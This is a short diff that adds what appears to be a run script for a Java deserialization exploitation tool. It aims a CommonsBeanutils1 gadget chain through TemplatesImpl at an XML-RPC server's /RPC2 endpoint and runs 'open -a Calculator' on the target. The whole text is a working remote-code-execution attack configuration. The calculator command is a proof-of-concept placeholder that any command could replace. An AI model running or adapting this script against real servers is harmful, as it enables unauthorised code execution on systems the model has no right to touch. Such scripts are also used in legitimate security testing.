@@ -1,0 +1,7 @@
+use exploit XmlRPCServer
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set path /RPC2
+set lport 8888
+set body "open -a Calculator"
+run
